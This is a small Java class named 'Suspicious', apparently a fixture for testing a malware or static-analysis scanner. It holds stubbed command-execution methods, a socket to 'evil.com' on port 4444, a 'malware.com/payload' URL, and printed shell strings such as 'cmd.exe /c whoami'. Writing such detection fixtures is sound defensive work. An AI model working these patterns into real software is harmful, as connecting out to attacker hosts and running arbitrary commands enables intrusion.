import java.lang.Runtime;
import java.lang.ProcessBuilder;
import java.net.Socket;
import java.net.URL;
import javax.crypto.Cipher;

public class Suspicious {
    public void executeCommand(String cmd) throws Exception {
        Runtime.getRuntime().exec(cmd);
    }
    
    public void processBuilder(String cmd) throws Exception {
        new ProcessBuilder(cmd).start();
    }
    
    public void networkCall() throws Exception {
        Socket s = new Socket("evil.com", 4444);
        URL url = new URL("http://malware.com/payload");
    }
    
    public void decrypt(byte[] data) throws Exception {
        Cipher c = Cipher.getInstance("AES");
    }
    
    public static void main(String[] args) {
        System.out.println("cmd.exe /c whoami");
        System.out.println("http://evil.com/dropper");
        System.out.println("/bin/bash -c");
    }
}
